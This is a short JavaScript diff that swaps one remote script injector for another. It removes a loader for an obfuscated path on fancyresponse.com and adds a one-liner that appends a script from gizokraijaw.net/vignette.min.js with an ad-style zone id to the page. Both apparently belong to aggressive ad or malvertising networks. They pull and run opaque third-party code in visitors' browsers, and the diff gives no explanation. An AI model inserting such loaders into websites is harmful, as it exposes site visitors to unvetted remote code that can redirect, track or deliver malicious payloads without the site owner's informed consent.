@@ -1,10 +1,1 @@
-(function(txbul){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = txbul || {};
-s.src = "\/\/fancyresponse.com\/beX.VcseddGJls0yYgWMcr\/WeKmo9_urZcUKlDkzPATTYw2\/MCzHIb2aMuz\/Q\/tCN\/jYYhzzMhjEYezrNpQd";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
+(s=>{s.dataset.zone=9794282,s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
